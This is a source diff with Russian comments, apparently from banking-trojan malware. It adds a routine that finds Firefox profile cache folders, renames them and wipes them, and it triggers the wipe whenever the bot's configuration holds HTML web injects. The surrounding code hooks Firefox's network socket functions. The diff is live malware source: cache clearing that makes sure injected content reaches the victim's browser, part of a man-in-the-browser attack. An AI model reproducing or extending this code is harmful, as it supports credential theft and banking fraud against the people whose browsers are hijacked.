@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <shlobj.h>
 
 #include <nss/ssl.h>
 #include <nspr/prio.h>
@@ -917,6 +918,67 @@ LPVOID NSPRAPI PR_OpenTCPSocketHook(int af)
 }
 
 
+//---------------------------------------------
+// Вспомогательная функция для обнаружения
+// папки кэша фф
+//---------------------------------------------
+void FF_CacheDirCompare(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel)
+{
+	DWORD Hash = STRA::Hash(Search->cFileName, 0, true);
+	if (Hash == 0x3C38F463 /* cache */)
+	{
+		// Для недопущения открытия базы кэша файрфоксом
+		// переименовываем папку. Что, в случае большого кэша,
+		// даст нам время на спокойное удаление.
+		string NewName = FileName;
+		NewName[NewName.Length() - 1] = '_';
+        BOOL Renamed = (BOOL)pMoveFileA(FileName, NewName.t_str());
+		if (Renamed)
+			((TBotStrings*)Data)->Add(NewName);
+		else
+			((TBotStrings*)Data)->Add(FileName);
+    }
+}
+
+//---------------------------------------------
+// Функция очищает кэш файрфокса
+//---------------------------------------------
+DWORD WINAPI ClearFireFoxCache(LPVOID)
+{
+	// При написании данной функции, возникла неоднозначность
+	// документации в интернете и реальной ситуации на моём
+	// компе. По докам инета кэш фф лежит в CSIDL_APPDATA,
+	// в реале и на семёрке и на хп в CSIDL_LOCAL_APPDATA.
+	// По этому проверяем обе директории.
+
+	const char* ProfileePath = "Mozilla\\Firefox\\Profiles\\";
+	const DWORD CSIDL[] = {CSIDL_APPDATA,
+					      CSIDL_LOCAL_APPDATA,
+					      0};
+
+	// Перебираем все директории профилей фф в поисках папки кэша
+
+    TBotStrings Paths;
+	for (int i = 0; CSIDL[i] != 0; i++)
+	{
+		string Path = GetSpecialFolderPathA(CSIDL[i], ProfileePath);
+		SearchFiles(Path.t_str(), "*", true, FA_DIRECTORY, &Paths, FF_CacheDirCompare);
+	}
+
+	// Очищаем найденные папки кэша
+	for (int i = 0; i < Paths.Count(); i++)
+	{
+		string Path = Paths.GetItem(i);
+		Directory::Clear(Path.t_str(), true);
+	}
+
+	return Paths.Count() > 0;
+}
+//-------------------------------------------------------------------------
+
+
+
+
 
 bool WINAPI CheckInCurrentDir( WCHAR *File )
 {
@@ -961,7 +1023,12 @@ bool HookMozillaFirefox()
 	{
 		//UnhookFF();
 		#ifdef FFInjects
-			Config::Initialize();
+			TBotConfig *Config = Config::Initialize();
+			if (Config && Config->HTMLInjects->Count())
+			{
+				// При загрузке конфига очищаем кэш
+				StartThread(ClearFireFoxCache, NULL);
+            }
 		#endif
 
 		// Инициализируем охотника за ссылками
